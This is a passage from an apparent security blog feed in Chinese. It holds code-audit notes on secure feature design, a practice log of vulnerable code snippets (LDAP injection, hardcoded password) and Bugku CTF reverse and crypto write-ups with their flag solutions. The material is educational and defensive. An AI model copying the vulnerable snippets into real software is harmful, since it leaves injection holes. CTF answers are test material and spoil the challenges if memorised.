title="充值支付"></a>充值支付</h4><p>主要有四种情况：客户端可修改单价、总价和购买数量以及利用时间差多次购买。<br>主要应对手法是：</p><ol><li>保证数据可信，商品单价和总价不可从客户端获取。</li><li>购买数量不能小于等于0。</li><li>账户支付锁定机制，当一个支付操作开始就应该立马锁定当前用户，不能同时两个后端请求对余额进行操作。</li></ol><h4 id="私信及反馈"><a href="#私信及反馈" class="headerlink" title="私信及反馈"></a>私信及反馈</h4><p>除去特殊情况下可以滤去的SQL注入或命令执行等少见漏洞外，最常见的就是XSS漏洞以及越权漏洞。</p><h4 id="远程地址访问"><a href="#远程地址访问" class="headerlink" title="远程地址访问"></a>远程地址访问</h4><p>访问远程地址获取资源的功能可能会被利用（如填入内网地址）<br>利用限制填写来防御该类漏洞，但大部分厂商修复时不会考虑到短地址的问题，修复后仍然可以通过生成短链接的方式利用。</p><h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><p>本身就是一个高危功能，权限管理不当会导致被攻击者利用写入webshell。<br>为了保证安全，在满足业务需求的情况下，设计时应遵循以下几点：</p><ol><li>禁止写入脚本可在服务器端执行的文件：如服务器可解析PHP，那么此次就需要限制不能操作PHP扩展名的文件和PHP标签的代码。</li><li>限制文件管理功能操作的目录：限制文件管理功能只能操作固定目录，目录不能从客户端提交，在代码中设置好即可，如果实在需要进行目录跳转的话，一定要禁止提交<code>../</code>以及<code>\..</code>避免越权操作其它目录。</li><li>限制文件管理功能访问权限：虽然文件管理是正常功能，但存在一点后门的性质，所以对该功能的访问权限一定要严格控制。</li><li>禁止上传特殊字符文件名的文件：大多数应用会对上传文件进行展示，特别是网盘类应用，注意对上传文件名进行检查，禁止文件名中有尖括号、单双引号等特殊字符，避免攻击者用文件名进行XSS攻击。</li></ol><h4 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h4><p>跟文件管理一样，也是高位功能，如果启动数据库服务的系统用户以及数据库用户的权限都够大，完全可以利用该功能直接执行系统命令及操作服务器上的文件。</p><ol><li>限制可以操作的数据库表，要么在代码内写死只能操作哪些表（如备份），如果是执行SQL语句的方式可以另建一个mysql用户，限制可操作的表和字段。</li><li>限制备份到服务器上的文件名，需要随机生成且长度不低于16位，扩展名不能自定义，防止攻击者利用该功能导出webshell或猜解文件名直接下载。</li></ol><h4 id="命令-代码执行"><a href="#命令-代码执行" class="headerlink" title="命令/代码执行"></a>命令/代码执行</h4><p>命令执行和代码执行功能通常都在系统后台，相比来说，命令执行的功能使用更多，代码执行功能在特殊应用上才会存在。设计该类功能时应该注意以下几点：</p><ol><li>严格控制该功能访问权限，建议高权限才能访问。</li><li>在满足业务需求的情况下，可以设置命令白名单，可以使用escapeshellcmd()以及escapeshellarg()函数进行过滤，命令直接写死在代码中更好。</li><li>给命令及代码执行功能设置独立密码。</li><li>代码执行功能限制脚本可访问的路径。</li><li>在满足需求的情况下限制当前执行命令的系统权限。</li></ol><h4 id="文件-数据库备份"><a href="#文件-数据库备份" class="headerlink" title="文件/数据库备份"></a>文件/数据库备份</h4><p>是非常常见且非常容易出现安全问题的功能。常见问题有：</p><ol><li>未授权访问和越权访问：未授权访问体现在这个备份功能直接在不登录或登录验证存在漏洞的情况下可以直接使用，以及存在CSRF漏洞可以直接劫持管理员帐号进行备份。</li><li>备份文件名可预测：攻击者可以利用枚举的方式扫描备份包。</li><li>生成的文件可利用web中间件解析漏洞执行代码<br>如何设计备份功能：</li><li>进行权限控制，只有高权限可以使用。</li><li>文件名随机生成，不可预测。</li></ol><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p>因为爬虫无法抓取APP中的API接口，所以接口的SQL注入等漏洞相对较多，目前最多的问题是未授权访问以及数据遍历漏洞。因此设计一个安全的API需要从以下几点考虑：</p><ol><li>访问权限控制：必要时加入账户体系，严格控制数据调用权限，比如当前用户必须在登录情况下，接口参数中传入自己登录成功的凭证才能调用这个用户的数据。另外不需要账户体系时也要注意加入不可暴力破解的访问密钥进行权限验证。</li><li>防止敏感信息泄漏：没必要输出的信息应该注意禁止输出。</li><li>SQL注入等常规漏洞：注意代码安全，防止SQL注入、代码执行等漏洞的产生。</li></ol><h3 id="应用安全体系建设"><a href="#应用安全体系建设" class="headerlink" title="应用安全体系建设"></a>应用安全体系建设</h3><ol><li>用户密码安全策略</li><li>前后台用户分表：同表的情况下可能存在越权修改管理员信息等情况。</li><li>后台地址隐藏</li><li>密码加密存储方式</li><li>登录限制</li><li>API站库分离</li><li>慎用第三方服务</li><li>严格的权限控制</li><li>敏感操作多因素验证</li><li>应用自身的安全中心</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;苦于代码审计能力偏弱，调研一番发现这本书或许有所帮助。&lt;/p&gt;
&lt;h2 id=&quot;第一部分-代码审计前的准备&quot;&gt;&lt;a href=&quot;#第一部分-代码审计前的准备&quot; class=&quot;headerlink&quot; title=&quot;第一部分 代码审计前的准备&quot;&gt;&lt;/a&gt;第一部分 代码审计前的准</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="140 Code review 代码审计" scheme="https://tsunamori.github.io/categories/100-Cyber-security/140-Code-review-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="149 Notes" scheme="https://tsunamori.github.io/categories/100-Cyber-security/140-Code-review-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/149-Notes/"/>
    
    
    <category term="Notes" scheme="https://tsunamori.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Game of hacks 试玩</title>
    <link href="https://tsunamori.github.io/wiki/%E8%AF%95%E7%8E%A9Game-of-hacks/"/>
    <id>https://tsunamori.github.io/wiki/%E8%AF%95%E7%8E%A9Game-of-hacks/</id>
    <published>2021-07-15T21:44:14.000Z</published>
    <updated>2021-07-17T11:21:26.923Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从Awesome-hacking_Cyber-skills看到的练习网站，粗略看了一下描述是关于代码审计的，正好一直在考虑提升一下代码审计的技能，最近就来试玩一下，顺便记录WP。</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>一开始有难度选项，分别是beginner、intermediate和advanced。嗯，十分正常的分类。另外要选代码语言，一共十种，我比较在意的Android、Java、PHP、Python、.NET都在，令人满意。<br>看了题目大概是每次随机抽五道题+计时+提供选项，所以WP就先简单记一下代码，最后整理思路。</p><h3 id="PHP-代码审计"><a href="#PHP-代码审计" class="headerlink" title="PHP 代码审计"></a>PHP 代码审计</h3><h4 id="Beginner"><a href="#Beginner" class="headerlink" title="Beginner"></a>Beginner</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int i;</span><br><span class="line">char inLine[64];</span><br><span class="line">cin &gt;&gt; inLine; &#x2F;&#x2F; 将cin的二进制码向右移动inLine位（或将cin十进制除以2 inLine次）,但是在这里没有用到。</span><br><span class="line">i &#x3D; atoi (inLine); &#x2F;&#x2F; atoi()：字符串转换整数</span><br><span class="line">sleep(i);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dim myPassWord As String</span><br><span class="line">myPassWord &#x3D; &quot;12345&quot;</span><br></pre></td></tr></table></figure><p>use of hardcoded password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Private Sub cmdRunNotePad_Click()</span><br><span class="line">Dim str As String</span><br><span class="line">MyVar &#x3D; window.Text()</span><br><span class="line">Sleep myVar+1</span><br><span class="line">dblNotePadID &#x3D; Sleep(myVar)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dn &#x3D; $_GET[&#39;host&#39;];</span><br><span class="line">$filter&#x3D;&quot;(|(sn&#x3D;$person*)(givenname&#x3D;$person*))&quot;;</span><br><span class="line">$justthese &#x3D; array(&quot;ou&quot;, &quot;sn&quot;, &quot;givenname&quot;, &quot;mail&quot;);</span><br><span class="line">$sr&#x3D;ldap_search($ds, $dn, $dn, $justthese);</span><br><span class="line">$info &#x3D; ldap_get_entries($ds, $sr);</span><br><span class="line">echo $info[&quot;count&quot;].&quot; entries returned</span><br><span class="line">&quot;;?&gt;</span><br></pre></td></tr></table></figure><p>LDAP injection</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String url &#x3D; req.getRequestURL().toString();</span><br><span class="line">RequestDispatcher disp &#x3D; req.getRequestDispatcher(url.substring(url.lastIndexOf(req.getContextPath() + &quot;&#x2F;&quot;)</span><br><span class="line">+ req.getContextPath().length()));</span><br><span class="line">disp.forward(request, response);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;从Awesome-hacking_Cyber-skills看到的练习网站，粗略看了一下描述是关于代码审计的，正好一直在考虑提升一下代码审计的</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="140 Practices" scheme="https://tsunamori.github.io/categories/100-Cyber-security/140-Practices/"/>
    
    
    <category term="靶场" scheme="https://tsunamori.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>WP-Bugku-Reverse</title>
    <link href="https://tsunamori.github.io/wiki/WP-Bugku-Reverse/"/>
    <id>https://tsunamori.github.io/wiki/WP-Bugku-Reverse/</id>
    <published>2021-06-24T19:44:06.000Z</published>
    <updated>2021-12-08T09:59:58.878Z</updated>
    
    <content type="html"><![CDATA[<h4 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h4><ul><li>解题思路：丢进IDA Pro，可以直接看到flag内容。（似乎没有什么更好的一键复制的办法，如果无法直接显示十六进制的字符转换，可以选中该行按R）</li></ul><h4 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h4><ul><li>解题思路：直接jadx-gui打开（很久没用安卓逆向工具了，比较了一番发现jadx用起来还是很省时省力的）<br>MainActivity里找到关键的Java语句：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void checkPassword(String str) &#123;</span><br><span class="line">    if (str.equals(new String(Base64.decode(new StringBuffer(getFlag()).reverse().toString(), 0)))) &#123;</span><br><span class="line">        showMsgToast(&quot;Congratulations !&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        showMsgToast(&quot;Try again.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">private String getFlag() &#123;</span><br><span class="line">    return getBaseContext().getString(R.string.toString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>跟踪去R里找string.toString:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static final int toString &#x3D; 2131427360;</span><br></pre></td></tr></table></figure>这里只是为创建的值创建一个位置，真正的值不在这里。从resources.arsc里，按照R中toString的位置，找values文件夹内的strings.xml，搜索toString，得到值，再reverse一下，base64解码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">text &#x3D; &#39;991YiZWOz81ZhFjZfJXdwk3X1k2XzIXZIt3ZhxmZ&#39;</span><br><span class="line">text_re &#x3D; text[::-1]</span><br><span class="line">result &#x3D; base64.b64decode(text_re)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></li></ul><h4 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h4><ul><li>解题思路：估计是一开始直接搜关键词的太多了，现在做出来的值就是拆成两半而且逆序的字符串了。</li></ul><ol><li>用IDA：找到主函数，F5进psudocode。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax</span><br><span class="line">  __m128i v5; &#x2F;&#x2F; [esp+0h] [ebp-44h] BYREF</span><br><span class="line">  __int64 v6; &#x2F;&#x2F; [esp+10h] [ebp-34h]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+18h] [ebp-2Ch]</span><br><span class="line">  __int16 v8; &#x2F;&#x2F; [esp+1Ch] [ebp-28h]</span><br><span class="line">  char v9[32]; &#x2F;&#x2F; [esp+20h] [ebp-24h] BYREF</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; _mm_loadu_si128((const __m128i *)&amp;xmmword_413E34);</span><br><span class="line">  v7 &#x3D; 0;</span><br><span class="line">  v6 &#x3D; &#39;&#125;FTCTUD&#39;;</span><br><span class="line">  v8 &#x3D; 0;</span><br><span class="line">  printf(&quot;欢迎来到DUTCTF呦\n&quot;);</span><br><span class="line">  printf(&quot;这是一道很可爱很简单的逆向题呦\n&quot;);</span><br><span class="line">  printf(&quot;输入flag吧:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, v9);</span><br><span class="line">  v3 &#x3D; strcmp(v5.m128i_i8, v9);</span><br><span class="line">  if ( v3 )</span><br><span class="line">    v3 &#x3D; v3 &lt; 0 ? -1 : 1;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    printf(aFlag_0);</span><br><span class="line">  else</span><br><span class="line">    printf(aFlagGet);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>可以看到关键在V5这个变量，而这个变量在前面声明了，v5 = _mm_loadu_si128((const __m128i *)&amp;xmmword_413E34);。<br>双击跳转回汇编区，找到xmmword_413E34值（有两段），按R键转换成字符串拼接，得到flag。</li><li>稍微磨合了一下OD，发现如果会用的话这个可能也很方便。OD打开文件，汇编区右键-&gt;查找-&gt;所有参考文本字串，由于我们用IDA看过了整个流程，所以我们知道第一行的ASCII “%s”是获取flag对比时的文本。双击跳转回汇编，阅读汇编内容，这里涉及了eax ecx两个值，在差不多的地方下个硬件断点（右键-&gt;断点-&gt;硬件执行），保证能看到这两个值里面是什么内容就可以，点红色三角运行程序，输入任意值，到断点自动停止，查看寄存器中两个值的内容，得到flag。</li></ol><h4 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h4><ul><li>解题思路：想办法利用回环创造3个连在一起（1-8是个回环，8和1是串联的）的灭状态灯，再点亮。</li></ul><h4 id="easy-vb"><a href="#easy-vb" class="headerlink" title="easy_vb"></a>easy_vb</h4><ul><li>解题思路：IDA打开，阅读汇编码，从<code>push    offset aMctfN3tRev1sE4</code>找到flag。（一开始还以为这是个假flag，因为提示给的是flag{}，结果读了一遍hex没找到其它关键内容。正确flag就是把这个{}前面改成flag就好了）</li></ul><h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><ul><li>解题思路：鉴于是个APK文件，开jadx-gui看一下MainActivity，找到关键部分：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">        public void run() &#123;</span><br><span class="line">            MainActivity.this.t &#x3D; System.currentTimeMillis();</span><br><span class="line">            MainActivity.this.now &#x3D; (int) (MainActivity.this.t &#x2F; 1000);</span><br><span class="line">            MainActivity.this.t &#x3D; 1500 - (MainActivity.this.t % 1000);</span><br><span class="line">            tv2.setText(&quot;AliCTF&quot;);</span><br><span class="line">            if (MainActivity.this.beg - MainActivity.this.now &lt;&#x3D; 0) &#123;</span><br><span class="line">                tv1.setText(&quot;The flag is:&quot;);</span><br><span class="line">                tv2.setText(&quot;alictf&#123;&quot; + MainActivity.this.stringFromJNI2(MainActivity.this.k) + &quot;&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if (MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) &#123;</span><br><span class="line">                MainActivity.this.k +&#x3D; 100;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.k--;</span><br><span class="line">            &#125;</span><br><span class="line">            tv1.setText(&quot;Time Remaining(s):&quot; + (MainActivity.this.beg - MainActivity.this.now));</span><br><span class="line">            handler.postDelayed(this, MainActivity.this.t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h4><ul><li>对我来说算是复健题，新学一个小技巧，把图片格式的信息直接输入chrome搜索栏可以生成图片。</li></ul><h4 id="love"><a href="#love" class="headerlink" title="love"></a>love</h4><ul><li>shift+F12 通过字符串找关键词定位位置-&gt;在该位置调伪代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sub_41132F(&quot;please enter the flag:&quot;, v7);</span><br><span class="line">sub_411375(&quot;%20s&quot;, (char)Str);</span><br><span class="line">v3 &#x3D; j_strlen(Str);</span><br><span class="line">v4 &#x3D; (const char *)sub_4110BE(Str, v3, v14);</span><br><span class="line">strncpy(Destination, v4, 0x28u);</span><br><span class="line">v11 &#x3D; j_strlen(Destination);</span><br><span class="line">for ( j &#x3D; 0; j &lt; v11; ++j )</span><br><span class="line">  Destination[j] +&#x3D; j;</span><br><span class="line">v5 &#x3D; j_strlen(Destination);</span><br><span class="line">if ( !strncmp(Destination, Str2, v5) )</span><br><span class="line">  sub_41132F(&quot;rigth flag!\n&quot;, v8);</span><br><span class="line">else</span><br><span class="line">  sub_41132F(&quot;wrong flag!\n&quot;, v8);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;入门逆向&quot;&gt;&lt;a href=&quot;#入门逆向&quot; class=&quot;headerlink&quot; title=&quot;入门逆向&quot;&gt;&lt;/a&gt;入门逆向&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;解题思路：丢进IDA Pro，可以直接看到flag内容。（似乎没有什么更好的一键复制的办法，如果无法直接显示十六</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="123 Reverse" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/123-Reverse/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://tsunamori.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Web-cache-posioning</title>
    <link href="https://tsunamori.github.io/wiki/Web-cache-posioning/"/>
    <id>https://tsunamori.github.io/wiki/Web-cache-posioning/</id>
    <published>2021-06-21T14:27:26.000Z</published>
    <updated>2021-06-28T13:29:54.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h2><ol><li>BlackHat2020议题之Web缓存投毒 <a href="https://www.anquanke.com/post/id/213597">https://www.anquanke.com/post/id/213597</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;缓存投毒&quot;&gt;&lt;a href=&quot;#缓存投毒&quot; class=&quot;headerlink&quot; title=&quot;缓存投毒&quot;&gt;&lt;/a&gt;缓存投毒&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;BlackHat2020议题之Web缓存投毒 &lt;a href=&quot;https://www.anquanke.com</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>WP-Bugku-Misc</title>
    <link href="https://tsunamori.github.io/wiki/WP-Bugku-Misc/"/>
    <id>https://tsunamori.github.io/wiki/WP-Bugku-Misc/</id>
    <published>2021-06-17T20:04:40.000Z</published>
    <updated>2021-06-17T14:43:08.365Z</updated>
    
    <content type="html"><![CDATA[<h4 id="社工-进阶收集"><a href="#社工-进阶收集" class="headerlink" title="社工-进阶收集"></a>社工-进阶收集</h4><ul><li>解题思路：～～这种社工题，不会的建议多看凉风的视频，看过的都说好。～～<br>截下来风景图片，丢进百度识图，找到地点，打开百度地图，找站点，再打开地铁线路图辅助找目标站，再找半径符合的地方。<br>（就是标准答案有那么点离谱。）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;社工-进阶收集&quot;&gt;&lt;a href=&quot;#社工-进阶收集&quot; class=&quot;headerlink&quot; title=&quot;社工-进阶收集&quot;&gt;&lt;/a&gt;社工-进阶收集&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;解题思路：～～这种社工题，不会的建议多看凉风的视频，看过的都说好。～～&lt;br&gt;截下来风景</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="126 Misc" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/126-Misc/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://tsunamori.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Bugbounty_tools</title>
    <link href="https://tsunamori.github.io/wiki/Bugbounty-tools/"/>
    <id>https://tsunamori.github.io/wiki/Bugbounty-tools/</id>
    <published>2021-05-28T08:20:19.000Z</published>
    <updated>2021-07-17T11:21:26.923Z</updated>
    
    <content type="html"><![CDATA[<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><ol><li>oneforall</li><li>censys</li><li>google</li></ol><h3 id="Bugbounty-Cheatsheets"><a href="#Bugbounty-Cheatsheets" class="headerlink" title="Bugbounty_Cheatsheets"></a>Bugbounty_Cheatsheets</h3><ol><li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet">https://github.com/EdOverflow/bugbounty-cheatsheet</a></li></ol><h3 id="综合资源"><a href="#综合资源" class="headerlink" title="综合资源"></a>综合资源</h3><ol><li><a href="https://github.com/djadmin/awesome-bug-bounty">https://github.com/djadmin/awesome-bug-bounty</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;子域名收集&quot;&gt;&lt;a href=&quot;#子域名收集&quot; class=&quot;headerlink&quot; title=&quot;子域名收集&quot;&gt;&lt;/a&gt;子域名收集&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;oneforall&lt;/li&gt;
&lt;li&gt;censys&lt;/li&gt;
&lt;li&gt;google&lt;/li&gt;
&lt;/ol&gt;</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>WP-Bugku-Crypto</title>
    <link href="https://tsunamori.github.io/wiki/WP-Bugku-Crypto/"/>
    <id>https://tsunamori.github.io/wiki/WP-Bugku-Crypto/</id>
    <published>2021-05-17T22:02:34.000Z</published>
    <updated>2021-07-12T13:37:33.560Z</updated>
    
    <content type="html"><![CDATA[<h4 id=""><a href="#" class="headerlink" title="/.-"></a>/.-</h4><p>提示： ..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-</p><ul><li>解题思路：搞了半天，因为有前后两个ASCII码所以直接写pycode总是很难搞，还是从网上找了在线工具： <a href="https://www.ctftools.com/down/down/passwd/">https://www.ctftools.com/down/down/passwd/</a> ，相当方便了。</li></ul><h4 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h4><p>提示：一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</p><ul><li>解题思路：根据提示可得栅栏加密。</li></ul><h4 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h4><p>提示：Ook.</p><ul><li>解题思路：根据提示，可得brainfuck/Ook加密。</li></ul><h4 id="lt-gt"><a href="#lt-gt" class="headerlink" title="[+-&lt;&gt;]"></a>[+-&lt;&gt;]</h4><p>提示：<code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- ----- ---.&lt; +++++ ++[-&gt; +++++ ++&lt;]&gt; +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.--. ----. --.++ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +.++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----- ----. -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;+. ----. ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- .+.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</code></p><ul><li>解题思路：跟上个一样，这个是brainfuck。</li></ul><h4 id="把猪困在猪圈里"><a href="#把猪困在猪圈里" class="headerlink" title="把猪困在猪圈里"></a>把猪困在猪圈里</h4><p>提示： flag{}</p><ul><li>密文开头有个<code>/9j/</code>，结尾有等号，是比较明显的base64转图片的提示。利用 <a href="http://tool.chinaz.com/tools/imgtobase/">http://tool.chinaz.com/tools/imgtobase/</a>  网站解密，在开头加<code>data:image/jpg;base64,</code>补全图片头，得到猪圈密码图片，对照密码表解密得到flag。</li></ul><h4 id="你喜欢下棋吗"><a href="#你喜欢下棋吗" class="headerlink" title="你喜欢下棋吗"></a>你喜欢下棋吗</h4><p>提示：解压密码为小写<br>4423244324433534315412244543</p><ul><li>解题思路：下棋，提示了这是棋盘密码。查了一下，棋盘密码有两种，一种是Polybius密码，密文为两两组合的数字，另一种是ADFGX密码，密文为两两组合的字母。<br>但是看在线的解密都要密钥，看别人的WP才发现他们解密用的常见密码表，行吧。<br>这里得到密码，解压文件，得到下一个密文<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一种5bit的编码</span><br><span class="line">bugku里面的内容为小写</span><br><span class="line">bugku&#123;11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 